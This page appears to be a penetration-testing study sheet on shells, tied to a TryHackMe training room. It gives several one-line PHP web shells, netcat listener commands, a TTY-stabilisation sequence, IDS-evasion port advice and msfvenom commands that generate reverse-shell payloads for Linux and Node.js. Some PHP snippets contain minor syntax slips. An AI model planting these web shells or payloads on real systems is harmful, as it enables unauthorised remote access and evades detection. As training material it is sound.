# Shell

[![introtoshells](../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

<div class="row row-cols-md-2"><div>

The best kind of situation of a hacker is when it's possible to run commands on the target, or better, to run code on the target. The hacker will typically exploit a vulnerability <small>(ex: file upload, command injection...)</small> leading to a **RCE**

* Remote Command Execution
* Remote Code Execution

On Kali, you can find preinstalled reverse/web shells inside

```bash
$ ls /usr/share/webshells
```
</div><div>

The script leading to a RCE could use

* a **reverse shell**: we open a port on our machine, and the target connect to it. We can run commands on the target, and hopefully do a successful privilege escalation.
* a **bind shell**: we open a port on the target and connect to it. This is like SSH, but we with a port we picked, and no login/password.
* a **web shell**: we are using a webpage with a form to run commands. It's a bit hard to use, but it may be the only way.

> To avoid alerting IDS, a bind/reverse shell should use a port that would not be suspected such as `443` (HTTPS).<br>
>
> It's not always possible to use a bind/reverse shell, there will most likely be a firewall blocking access.
</div></div>

> There is a script called [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ⭐, 2018/2019) that is a simplified interface to create reverse/bind/web shells.

<hr class="sep-both">

## web shell in PHP

If you created a file **xxx.php**, then you can run commands by accessing the URL **xxx.php?cmd=payload**.

<div class="row row-cols-md-2 mt-4"><div>

* ➡️ compact one-line web shell with `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php
<?=system($_GET["cmd"]." &2>1" ?? "whoami");?>
```

* ➡️ simple web shell with `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php
<?php
echo system($_GET["cmd"]." &2>1" ?? "whoami");
?>
```
</div><div>

* ➡️ simple web shell with `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php
<?php
$output = "";
exec ($_GET["cmd"]." &2>1" ?? "whoami", $output).;
echo implode(' ', $output);
?>
```

* ➡️ simple web shell with `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php
<?php
echo passthru($_GET["cmd"]." &2>1" ?? "whoami");
?>
```
</div></div>

<hr class="sep-both">

## Notes on reverse/bind shells

<div class="row row-cols-md-2"><div>

In a reverse shell, the hacker will usually listen on a port

```bash
$ nc -lnvp port
```

While in a bind shell, the hacker will listen

```bash
$ nc IP port
```

In any case, it's worth noting that such a shell is instable. 

* If you press CTRL+C, then the shell will dies while you may have wanted to cancel a command on the target instead.
* You may also want to use TAB or other utilities that make life easier.
* You can use commands requiring user input

You may also want to change the size of the terminal

* First, open another terminal and resize it with the size you want. Use `stty -a` and take note of the number of rows/columns.
* If the terminal you want to resize, use `stty rows n` and `stty cols n`
</div><div>

There are a few solutions way to make things better

* ➡  Manually

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
xxx@yyy:path$ export TERM=xterm # can use clear...
xxx@yyy:path$ # CTRL+Z
kali@kali:/tmp$ stty raw -echo; fg
xxx@yyy:path$ # can use CTRL+C / ...
xxx@yyy:path$ exit
kali@kali:/tmp$ reset # restore your terminal
```

* ➡️ Use a wrapper such as [rlwrap](https://github.com/hanslub42/rlwrap) (1.8k ⭐)

```bash
$ sudo rlwrap nc -lvnp 4444
xxx@yyy:path$ # still CTRL+C not working
```

* ➡️ Use a wrapper such as [penelope](https://github.com/brightio/penelope) (0.3k ⭐)

```bash
$ ./penelope.py 4444
xxx@yyy:path$ # every working?
```
</div></div>

<hr class="sep-both">

## Reverse shell

<div class="row row-cols-md-2"><div>

* ➡️PHP

You could check out [this script by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (1.4k ⭐, 2015).
</div><div>
</div></div>

<hr class="sep-both">

## msfvenom to create shells

You can use msfvenom to generate all kinds of reverse shells.

<div class="row row-cols-md-2"><div>

* List payloads

```bash
$ msfvenom --list payloads
# payload opening a meterpreter - see metasploit
$ msfvenom --list payloads | grep meterpreter
```

* **Linux**

```bash
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (R=RAW) opening a reverse shell with netcat
# same as "-f raw" (to check)?
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 R
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

...
</div></div>